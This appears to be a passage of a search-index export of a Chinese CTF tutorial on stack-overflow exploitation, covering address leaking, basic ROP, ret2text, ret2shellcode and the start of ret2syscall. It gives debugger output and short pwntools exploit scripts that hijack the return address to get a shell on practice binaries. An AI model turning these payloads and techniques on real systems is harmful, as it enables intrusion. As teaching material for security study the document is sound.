\u5728\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\u6709\u5982\u4e0b\u51e0\u79cd \u901a\u7528\u5bfb\u627e \u00b6 \u76f4\u63a5\u5730\u5740\u5bfb\u627e \u00b6 \u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002 got \u8868\u5bfb\u627e \u00b6 \u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528 GOT \u8868\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 write\uff0cputs \u7b49\u8f93\u51fa\u51fd\u6570\u5c06 GOT \u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08 \u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86 \uff09\u3002 \u6709 libc \u00b6 \u76f8\u5bf9\u504f\u79fb\u5bfb\u627e \uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528 libc \u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 __libc_start_main \u7684\u5730\u5740\u6765\u6cc4\u6f0f libc \u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002 \u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002 \u5e38\u89c1\u7684\u6709wapper \u7684\u51fd\u6570\u6709\uff1f\uff08\u5f85\u8865\u5145\uff09\u3002 \u65e0 libc \u00b6 \u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd \u60f3\u529e\u6cd5\u83b7\u53d6 libc \u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002 \u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5 puts \uff0c write\uff0cprintf \u5747\u53ef\u4ee5\u3002 puts\uff0cprintf \u4f1a\u6709 \\x00 \u622a\u65ad\u7684\u95ee\u9898 write \u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5 pwnlib.dynelf \u00b6 \u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002 \u5982\u679c\u8981\u4f7f\u7528 write \u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4 shell \u4e0d\u80fd\u542f\u52a8\u3002 libc \u6570\u636e\u5e93 \u00b6 ## \u66f4\u65b0\u6570\u636e\u5e93 ./get ## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d ./add libc.so ## Find all the libc's in the database that have the given names at the given addresses. ./find function1 addr function2 addr ## Dump some useful offsets, given a libc ID. You can also provide your own names to dump. ./dump __libc_start_main_ret system dup2 \u53bb libc \u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684 libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u5728\u7ebf\u7f51\u7ad9: libcdb.com libc.blukat.me \u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684 https://github.com/lieanu/LibcSearcher \u3002 ret2dl-resolve \u00b6 \u5f53 ELF \u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgo t\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2a libc \u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve \u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020 ROP \u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7 rop \u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002 \u9898\u76ee \u00b6 train.cs.nctu.edu.tw: rop 2013-PlaidCTF-ropasaurusrex Defcon 2015 Qualifier: R0pbaby \u53c2\u8003\u9605\u8bfb \u00b6 \u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73) \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09 \u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09 \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP","title":"\u57fa\u672c ROP"},{"location":"pwn/stackoverflow/basic_rop/#rop","text":"\u968f\u7740 NX \u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662f ROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5( gadgets )\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u6240\u8c13gadgets \u5c31\u662f\u4ee5 ret \u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3a ROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684 ret \u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP \u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002 \u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684 gadgets \u4ee5\u53ca\u76f8\u5e94 gadgets \u7684\u5730\u5740\u3002 \u5982\u679c gadgets \u6bcf\u6b21\u7684\u5730\u5740\u662f\u4e0d\u56fa\u5b9a\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u52a8\u6001\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002","title":"\u57fa\u672c ROP"},{"location":"pwn/stackoverflow/basic_rop/#ret2text","text":"","title":"ret2text"},{"location":"pwn/stackoverflow/basic_rop/#_1","text":"ret2text \u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662f gadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684ROP\u3002 \u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/basic_rop/#_2","text":"\u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox \u4e2d\u4ecb\u7ecd ROP \u65f6\u4f7f\u7528\u7684 ret2text \u7684\u4f8b\u5b50\u3002 \u70b9\u51fb\u4e0b\u8f7d: ret2text \u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236 \u279c ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528 IDA \u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"There is something amazing here, do you know anything?\" ); gets (( char * ) & v4 ); printf ( \"Maybe I will tell you next time !\" ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86 gets \u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0 .text: 080485 FD secure proc near .text: 080485 FD .text: 080485 FD input = dword ptr - 10 h .text: 080485 FD secretcode = dword ptr - 0 Ch .text: 080485 FD .text: 080485 FD push ebp .text: 080485 FE mov ebp , esp .text: 08048600 sub esp , 28 h .text: 08048603 mov dword ptr [ esp ], 0 ; timer .text : 0804860 A call _time .text: 0804860 F mov [ esp ], eax ; seed .text : 08048612 call _srand .text: 08048617 call _rand .text: 0804861 C mov [ ebp + secretcode ], eax .text: 0804861 F lea eax , [ ebp + input ] .text: 08048622 mov [ esp + 4 ], eax .text: 08048626 mov dword ptr [ esp ], offset unk_8048760 .text: 0804862 D call ___isoc99_scanf .text: 08048632 mov eax , [ ebp + input ] .text: 08048635 cmp eax , [ ebp + secretcode ] .text: 08048638 jnz short locret_8048646 .text: 0804863 A mov dword ptr [ esp ], offset command ; \"/bin/sh\" .text : 08048641 call _system \u5728 secure \u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528 system(\"/bin/sh\") \u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f3 0x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684 shell \u4e86\u3002 \u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020 payload \u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u7684\u8d77\u59cb\u5730\u5740\u8ddd\u79bb main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002 .text: 080486 A7 lea eax , [ esp + 1 Ch ] .text: 080486 AB mov [ esp ], eax ; s .text : 080486 AE call _gets \u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8e esp \u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728 call \u5904\uff0c\u67e5\u770b esp\uff0cebp\uff0c\u5982\u4e0b gef\u27a4 b *0x080486AE Breakpoint 1 at 0x80486ae: file ret2text.c, line 24 . gef\u27a4 r There is something amazing here, do you know anything? Breakpoint 1 , 0x080486ae in main () at ret2text.c:24 24 gets ( buf ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ registers ] \u2500\u2500\u2500\u2500 $eax : 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebx : 0x00000000 $ecx : 0xffffffff $edx : 0xf7faf870 \u2192 0x00000000 $esp : 0xffffcd40 \u2192 0xffffcd5c \u2192 0x08048329 \u2192 \"__libc_start_main\" $ebp : 0xffffcdc8 \u2192 0x00000000 $esi : 0xf7fae000 \u2192 0x001b1db0 $edi : 0xf7fae000 \u2192 0x001b1db0 $eip : 0x080486ae \u2192 <main+102> call 0x8048460 <gets@plt> \u53ef\u4ee5\u770b\u5230 esp \u4e3a 0xffffcd40\uff0cebp \u4e3a\u5177\u4f53\u7684 payload \u5982\u4e0b 0xffffcdc8\uff0c\u540c\u65f6 s \u76f8\u5bf9\u4e8e esp \u7684\u7d22\u5f15\u4e3a [esp+0x1c]\uff0c\u6240\u4ee5\uff0cs \u7684\u5730\u5740\u4e3a 0xffffcd5c\uff0c\u6240\u4ee5 s \u76f8\u5bf9\u4e8e ebp \u7684\u504f\u79fb\u4e3a 0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a 0x6c+4\u3002 \u6700\u540e\u7684 payload \u5982\u4e0b\uff1a ##!/usr/bin/env python from pwn import * sh = process ( './ret2text' ) target = 0x804863a sh . sendline ( 'A' * ( 0x6c + 4 ) + p32 ( target )) sh . interactive ()","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/basic_rop/#ret2shellcode","text":"","title":"ret2shellcode"},{"location":"pwn/stackoverflow/basic_rop/#_3","text":"ret2shellcode\uff0c\u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c shellcode\u4ee3\u7801\u3002shellcode \u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684 shell\u3002 \u4e00\u822c\u6765\u8bf4\uff0cshellcode \u9700\u8981\u6211\u4eec\u81ea\u5df1\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801 \u3002 \u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u8981\u60f3\u6267\u884c shellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684 binary \u5728\u8fd0\u884c\u65f6\uff0cshellcode \u6240\u5728\u7684\u533a\u57df\u5177\u6709\u53ef\u6267\u884c\u6743\u9650\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/basic_rop/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d\u7684 ret2shellcode \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2shellcode \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4 \u279c ret2shellcode checksec ret2shellcode Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528 IDA \u770b\u4e00\u4e0b\u7a0b\u5e8f int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No system for you this time !!!\" ); gets (( char * ) & v4 ); strncpy ( buf2 , ( const char * ) & v4 , 0x64u ); printf ( \"bye bye ~\" ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230 buf2 \u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5 buf2 \u5728 bss \u6bb5\u3002 .bss: 0804 A080 public buf2 .bss: 0804 A080 ; char buf2[100] \u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2a bss \u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002 gef\u27a4 b main Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8 . gef\u27a4 r Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1 , main () at ret2shellcode.c:8 8 setvbuf ( stdout, 0LL, 2 , 0LL ) ; \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ source:ret2shellcode.c+8 ] \u2500\u2500\u2500\u2500 6 int main ( void ) 7 { \u2192 8 setvbuf ( stdout, 0LL, 2 , 0LL ) ; 9 setvbuf ( stdin, 0LL, 1 , 0LL ) ; 10 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x8048536 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so 0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so 0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [ vvar ] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [ vdso ] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so 0xfffdd000 0xffffe000 0x00000000 rwx [ stack ] \u901a\u8fc7 vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 bss \u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884c shellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165 shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884c bss \u6bb5\u5904\u7684 shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8e ret2text \u4e2d\u7684\u4f8b\u5b50\u3002 \u5177\u4f53\u7684 payload \u5982\u4e0b #!/usr/bin/env python from pwn import * sh = process ( './ret2shellcode' ) shellcode = asm ( shellcraft . sh ()) buf2_addr = 0x804a080 sh . sendline ( shellcode . ljust ( 112 , 'A' ) + p32 ( buf2_addr )) sh . interactive ()","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/basic_rop/#_5","text":"sniperoj-pwn100-shellcode-x86-64","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/basic_rop/#ret2syscall","text":"","title":"ret2syscall"},{"location":"pwn/stackoverflow/basic_rop/#_6","text":"ret2syscall\uff0c\u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6 shell\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/basic_rop/#_7","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d\u7684 ret2syscall \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2syscall \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4 \u279c ret2syscall checksec rop Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528 IDA \u6765\u67e5\u770b\u6e90\u7801 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"This time, no system() and NO SHELLCODE!!!\" ); puts ( \"What do you plan to do?\" ); gets ( & v4 ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97 v4 \u76f8\u5bf9\u4e8e ebp \u7684\u504f\u79fb\u4e3a 108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8e v4 